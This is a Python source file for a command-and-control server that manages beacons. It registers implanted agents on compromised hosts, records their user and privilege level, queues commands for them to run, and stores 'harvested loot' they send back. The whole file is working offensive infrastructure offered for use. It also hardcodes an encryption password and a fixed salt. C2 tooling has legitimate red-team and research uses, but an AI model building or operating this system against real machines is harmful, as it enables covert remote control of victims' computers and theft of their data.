"""
Real C2 Beacon Management System
Mythic/Sliver-style beacon handling with encryption
"""
import os
import json
import time
import uuid
import base64
import hashlib
import sqlite3
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ============== Encryption ==============

class C2Crypto:
    """AES encryption for C2 communications"""
    
    def __init__(self, key: str = None):
        if key:
            self.key = self._derive_key(key)
        else:
            self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def _derive_key(self, password: str) -> bytes:
        """Derive encryption key from password"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'monolith_c2_salt',  # In production, use random salt
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt(self, data: str) -> str:
        """Encrypt data and return base64"""
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, data: str) -> str:
        """Decrypt base64 encoded data"""
        try:
            decoded = base64.b64decode(data.encode())
            decrypted = self.cipher.decrypt(decoded)
            return decrypted.decode()
        except Exception:
            return ""
    
    def get_key_b64(self) -> str:
        """Get key as base64 for agent embedding"""
        return base64.b64encode(self.key).decode()


# ============== Data Models ==============

@dataclass
class Beacon:
    """Represents a connected beacon/agent"""
    beacon_id: str
    hostname: str
    username: str
    os_info: str
    arch: str
    pid: int
    ip_internal: str
    ip_external: str
    integrity: str  # low/medium/high/system
    first_seen: str
    last_seen: str
    sleep_interval: int
    jitter: int
    status: str  # active/dormant/dead
    encryption_key: str
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    def is_active(self, timeout_minutes: int = 5) -> bool:
        """Check if beacon is still active"""
        try:
            last = datetime.fromisoformat(self.last_seen)
            return datetime.now() - last < timedelta(minutes=timeout_minutes)
        except:
            return False


@dataclass
class Task:
    """Task to be executed by beacon"""
    task_id: str
    beacon_id: str
    command: str
    args: List[str]
    status: str  # pending/sent/completed/failed
    created_at: str
    sent_at: str
    completed_at: str
    output: str
    
    def to_dict(self) -> dict:
        d = asdict(self)
        d['args'] = json.dumps(self.args) if isinstance(self.args, list) else self.args
        return d


# ============== Database ==============

class BeaconDB:
    """SQLite database for beacon management"""
    
    def __init__(self, db_path: str = "/tmp/c2_beacons.db"):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS beacons (
                    beacon_id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    os_info TEXT,
                    arch TEXT,
                    pid INTEGER,
                    ip_internal TEXT,
                    ip_external TEXT,
                    integrity TEXT,
                    first_seen TEXT,
                    last_seen TEXT,
                    sleep_interval INTEGER DEFAULT 30,
                    jitter INTEGER DEFAULT 10,
                    status TEXT DEFAULT 'active',
                    encryption_key TEXT
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY,
                    beacon_id TEXT,
                    command TEXT,
                    args TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TEXT,
                    sent_at TEXT,
                    completed_at TEXT,
                    output TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS loot (
                    loot_id TEXT PRIMARY KEY,
                    beacon_id TEXT,
                    loot_type TEXT,
                    data TEXT,
                    created_at TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
                )
            """)
            conn.commit()
    
    def register_beacon(self, beacon: Beacon) -> bool:
        """Register or update beacon"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO beacons 
                (beacon_id, hostname, username, os_info, arch, pid, ip_internal, 
                 ip_external, integrity, first_seen, last_seen, sleep_interval, 
                 jitter, status, encryption_key)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                beacon.beacon_id, beacon.hostname, beacon.username, beacon.os_info,
                beacon.arch, beacon.pid, beacon.ip_internal, beacon.ip_external,
                beacon.integrity, beacon.first_seen, beacon.last_seen,
                beacon.sleep_interval, beacon.jitter, beacon.status, beacon.encryption_key
            ))
            conn.commit()
        return True
    
    def update_last_seen(self, beacon_id: str):
        """Update beacon last seen timestamp"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "UPDATE beacons SET last_seen = ?, status = 'active' WHERE beacon_id = ?",
                (datetime.now().isoformat(), beacon_id)
            )
            conn.commit()
    
    def get_beacon(self, beacon_id: str) -> Optional[Beacon]:
        """Get beacon by ID"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute(
                "SELECT * FROM beacons WHERE beacon_id = ?", (beacon_id,)
            ).fetchone()
            if row:
                return Beacon(**dict(row))
        return None
    
    def list_beacons(self, status: str = None) -> List[Beacon]:
        """List all beacons"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if status:
                rows = conn.execute(
                    "SELECT * FROM beacons WHERE status = ? ORDER BY last_seen DESC", 
                    (status,)
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM beacons ORDER BY last_seen DESC"
                ).fetchall()
            return [Beacon(**dict(row)) for row in rows]
    
    def add_task(self, task: Task) -> bool:
        """Add task for beacon"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO tasks (task_id, beacon_id, command, args, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                task.task_id, task.beacon_id, task.command,
                json.dumps(task.args), task.status, task.created_at
            ))
            conn.commit()
        return True
    
    def get_pending_tasks(self, beacon_id: str) -> List[Task]:
        """Get pending tasks for beacon"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("""
                SELECT * FROM tasks 
                WHERE beacon_id = ? AND status = 'pending'
                ORDER BY created_at ASC
            """, (beacon_id,)).fetchall()
            tasks = []
            for row in rows:
                d = dict(row)
                d['args'] = json.loads(d['args']) if d['args'] else []
                tasks.append(Task(**d))
            return tasks
    
    def mark_task_sent(self, task_id: str):
        """Mark task as sent to beacon"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "UPDATE tasks SET status = 'sent', sent_at = ? WHERE task_id = ?",
                (datetime.now().isoformat(), task_id)
            )
            conn.commit()
    
    def complete_task(self, task_id: str, output: str, success: bool = True):
        """Mark task as completed with output"""
        status = 'completed' if success else 'failed'
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "UPDATE tasks SET status = ?, completed_at = ?, output = ? WHERE task_id = ?",
                (status, datetime.now().isoformat(), output, task_id)
            )
            conn.commit()
    
    def get_tasks(self, beacon_id: str = None, limit: int = 50) -> List[Task]:
        """Get tasks, optionally filtered by beacon"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if beacon_id:
                rows = conn.execute("""
                    SELECT * FROM tasks WHERE beacon_id = ?
                    ORDER BY created_at DESC LIMIT ?
                """, (beacon_id, limit)).fetchall()
            else:
                rows = conn.execute("""
                    SELECT * FROM tasks ORDER BY created_at DESC LIMIT ?
                """, (limit,)).fetchall()
            tasks = []
            for row in rows:
                d = dict(row)
                d['args'] = json.loads(d['args']) if d['args'] else []
                tasks.append(Task(**d))
            return tasks
    
    def add_loot(self, beacon_id: str, loot_type: str, data: str):
        """Store harvested loot"""
        loot_id = str(uuid.uuid4())
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO loot (loot_id, beacon_id, loot_type, data, created_at)
                VALUES (?, ?, ?, ?, ?)
            """, (loot_id, beacon_id, loot_type, data, datetime.now().isoformat()))
            conn.commit()
        return loot_id
    
    def kill_beacon(self, beacon_id: str):
        """Mark beacon as dead"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "UPDATE beacons SET status = 'dead' WHERE beacon_id = ?",
                (beacon_id,)
            )
            conn.commit()


# ============== Beacon Manager ==============

class BeaconManager:
    """Main C2 beacon management class"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not hasattr(self, 'initialized'):
            self.db = BeaconDB()
            self.crypto = C2Crypto("monolith_default_key")
            self.initialized = True
            self._start_status_checker()
    
    def _start_status_checker(self):
        """Background thread to update beacon statuses"""
        def checker():
            while True:
                time.sleep(60)
                self._update_beacon_statuses()
        
        thread = threading.Thread(target=checker, daemon=True)
        thread.start()
    
    def _update_beacon_statuses(self):
        """Mark inactive beacons as dormant/dead"""
        beacons = self.db.list_beacons(status='active')
        for beacon in beacons:
            if not beacon.is_active(timeout_minutes=5):
                # Mark as dormant
                with sqlite3.connect(self.db.db_path) as conn:
                    conn.execute(
                        "UPDATE beacons SET status = 'dormant' WHERE beacon_id = ?",
                        (beacon.beacon_id,)
                    )
                    conn.commit()
    
    def handle_checkin(self, data: dict, remote_ip: str) -> dict:
        """Handle beacon check-in request"""
        beacon_id = data.get('id')
        
        if not beacon_id:
            # New beacon registration
            beacon_id = str(uuid.uuid4())
            beacon = Beacon(
                beacon_id=beacon_id,
                hostname=data.get('hostname', 'unknown'),
                username=data.get('username', 'unknown'),
                os_info=data.get('os', 'unknown'),
                arch=data.get('arch', 'x64'),
                pid=data.get('pid', 0),
                ip_internal=data.get('ip_internal', ''),
                ip_external=remote_ip,
                integrity=data.get('integrity', 'medium'),
                first_seen=datetime.now().isoformat(),
                last_seen=datetime.now().isoformat(),
                sleep_interval=data.get('sleep', 30),
                jitter=data.get('jitter', 10),
                status='active',
                encryption_key=self.crypto.get_key_b64()
            )
            self.db.register_beacon(beacon)
            
            return {
                "status": "registered",
                "id": beacon_id,
                "key": self.crypto.get_key_b64(),
                "sleep": 30,
                "jitter": 10
            }
        else:
            # Existing beacon check-in
            self.db.update_last_seen(beacon_id)
            
            # Get pending tasks
            tasks = self.db.get_pending_tasks(beacon_id)
            task_list = []
            
            for task in tasks[:5]:  # Max 5 tasks per check-in
                task_list.append({
                    "task_id": task.task_id,
                    "command": task.command,
                    "args": task.args
                })
                self.db.mark_task_sent(task.task_id)
            
            beacon = self.db.get_beacon(beacon_id)
            
            return {
                "status": "ok",
                "tasks": task_list,
                "sleep": beacon.sleep_interval if beacon else 30,
                "jitter": beacon.jitter if beacon else 10
            }
    
    def handle_result(self, beacon_id: str, data: dict) -> dict:
        """Handle task result from beacon"""
        task_id = data.get('task_id')
        output = data.get('output', '')
        success = data.get('success', True)
        loot_type = data.get('loot_type')
        
        if task_id:
            self.db.complete_task(task_id, output, success)
        
        # Store loot if present
        if loot_type and output:
            self.db.add_loot(beacon_id, loot_type, output)
        
        self.db.update_last_seen(beacon_id)
        
        return {"status": "received"}
    
    def queue_task(self, beacon_id: str, command: str, args: List[str] = None) -> str:
        """Queue a task for beacon"""
        task = Task(
            task_id=str(uuid.uuid4()),
            beacon_id=beacon_id,
            command=command,
            args=args or [],
            status='pending',
            created_at=datetime.now().isoformat(),
            sent_at='',
            completed_at='',
            output=''
        )
        self.db.add_task(task)
        return task.task_id
    
    def list_beacons(self, status: str = None) -> List[dict]:
        """List all beacons as dicts"""
        beacons = self.db.list_beacons(status)
        return [b.to_dict() for b in beacons]
    
    def get_beacon(self, beacon_id: str) -> Optional[dict]:
        """Get single beacon"""
        beacon = self.db.get_beacon(beacon_id)
        return beacon.to_dict() if beacon else None
    
    def get_tasks(self, beacon_id: str = None) -> List[dict]:
        """Get tasks"""
        tasks = self.db.get_tasks(beacon_id)
        return [t.to_dict() for t in tasks]
    
    def kill_beacon(self, beacon_id: str):
        """Kill a beacon"""
        # Queue exit task
        self.queue_task(beacon_id, "exit", [])
        self.db.kill_beacon(beacon_id)
    
    def update_beacon_config(self, beacon_id: str, sleep: int = None, jitter: int = None):
        """Update beacon sleep/jitter"""
        with sqlite3.connect(self.db.db_path) as conn:
            if sleep is not None:
                conn.execute(
                    "UPDATE beacons SET sleep_interval = ? WHERE beacon_id = ?",
                    (sleep, beacon_id)
                )
            if jitter is not None:
                conn.execute(
                    "UPDATE beacons SET jitter = ? WHERE beacon_id = ?",
                    (jitter, beacon_id)
                )
            conn.commit()
    
    def get_loot(self, beacon_id: str = None) -> List[dict]:
        """Get collected loot"""
        with sqlite3.connect(self.db.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if beacon_id:
                rows = conn.execute(
                    "SELECT * FROM loot WHERE beacon_id = ? ORDER BY created_at DESC",
                    (beacon_id,)
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM loot ORDER BY created_at DESC"
                ).fetchall()
            return [dict(row) for row in rows]


# ============== Singleton accessor ==============

def get_beacon_manager() -> BeaconManager:
    """Get singleton BeaconManager instance"""
    return BeaconManager()
